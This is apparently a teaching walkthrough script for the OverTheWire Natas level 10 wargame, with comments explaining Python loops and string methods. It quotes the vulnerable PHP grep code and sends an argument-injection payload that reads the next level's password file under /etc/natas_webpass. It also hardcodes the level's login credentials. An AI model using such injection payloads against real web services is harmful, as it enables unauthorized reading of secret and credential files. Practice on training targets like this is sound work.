#!/usr/bin/env python

import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'
url = 'http://%s.natas.labs.overthewire.org/' % username

"""Starting with our default stuff"""
#response = requests.get(url, auth = (username, password))
#content = response.text
#print(content)

"""Ooookay so they claim to have improved security, "For security reasons, we now filter on certain characters"""
#response = requests.get(url + "index-source.html", auth = (username, password))
#content = response.text
#print(content)


"""This looks pretty similar to last time, except they are filtering for I think just these characters: [;|&]
Note on the above: yes, it is only those characters, they are escape character filtering similar to how we need to in python:
https://www.w3schools.com/python/python_strings_escape.asp
Not that the slaches // matter, but it could
<?
$key  =  "";

if(array_key_exists("needle",  $_REQUEST)) {
        $key = $_REQUEST["needle"];
}

if($key != "")  {
        if(preg_match('/[;|&]/',$key)) {
                print  "Input contains an illegal  character!"; So if we use the solution from last time it just complains..
        }  else {
                passthru("grep -i $key dictionary.txt"); 
        }
}
?>It doesn't exclude that many characters, though
Not even ezpz ones if you know the right trick
This page has more, hearkening back to the Bandit challenges: https://unix.stackexchange.com/questions/114300/whats-the-meaning-of-a-dot-before-a-command-in-shell"""
response = requests.post(url, data = {"needle": ". /etc/natas_webpass/natas11", "submit" : "Search"}, auth = (username, password))
content = response.text
#print(content)
"""So this is still printing the whole dictionary and not really a step up from the last level. So we're going to format this nicely.
Regex doesn't really do waht we want here, unless we knew exactly what we wanted. We can't grep the output becuase piping isn't allowed
I found this dicussion on how to 'grep' in python https://stackoverflow.com/questions/47977169/what-is-the-grep-equivalent-in-python"""

for line in content.split('\n'):
    if 'natas11' in line:
        print(line)

"""There, that looks a little nicer!
We have not explicitly talked about for loops and if statements in a solution yet. They are in the W3 schools tutorials I recommended before we started
If (heh) you have questions on the logic, please let me know!
Note use of the 'in' keyword: https://www.w3schools.com/python/ref_keyword_in.asp
Also, 'split' is a string method: https://www.w3schools.com/python/ref_string_split.asp"""




"""SDG"""



